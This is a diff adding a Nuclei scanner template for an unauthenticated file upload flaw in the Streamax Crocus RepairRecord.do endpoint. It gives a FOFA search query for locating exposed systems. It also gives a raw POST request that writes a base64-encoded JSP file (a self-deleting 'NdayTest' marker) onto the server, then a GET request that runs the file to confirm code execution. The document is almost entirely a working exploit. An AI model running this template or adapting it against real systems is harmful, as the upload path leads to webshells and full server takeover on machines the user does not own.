@@ -1,0 +1,44 @@
+id: ruiming-crocus-repairrecord-do-file-upload
+info:
+  name: 锐明 Crocus RepairRecord.do 接口文件上传
+  author: 0dayPoc
+  severity: high
+  description: |-
+    fofa: body="/ThirdResource/respond/respond.min.js" && title="Crocus"
+
+    该漏洞源于锐明技术 Crocus 系统中的 RepairRecord.do 接口存在安全缺陷。攻击者可通过构造恶意请求上传任意文件至目标服务器，进而利用上传的 Webshell 实现远程代码执行，最终完全控制服务器。
+  tags: 锐明
+
+flow: http(1) && http(2)
+
+http:
+- raw:
+  - |
+    POST /RepairRecord.do?Action=imageupload HTTP/1.1
+    Host: {{Hostname}}
+    Content-Type: application/json
+    Accept-Encoding: gzip, deflate
+    Accept: */*
+    Connection: close
+
+    {
+      "username": "streamax20020818",
+      "license": "1",
+      "chnnel": 1,
+      "type": 1,
+      "imsage": "PCUgb3V0LnByaW50bG4oIk5kYXlUZXN0Iik7IG5ldyBqYXZhLmlvLkZpbGUoYXBwbGljYXRpb24uZ2V0UmVhbFBhdGgocmVxdWVzdC5nZXRTZXJ2bGV0UGF0aCgpKSkuZGVsZXRlKCk7ICU+",
+      "picturename": "NTest.jsp"
+    }
+- raw:
+  - |
+    GET /SystemFile/PictureRecord/imageupload/NTest.jsp HTTP/1.1
+    Host: {{Hostname}}
+  matchers-condition: and
+  matchers:
+  - type: status
+    status:
+    - 200
+  - type: word
+    part: body
+    words:
+    - NdayTest
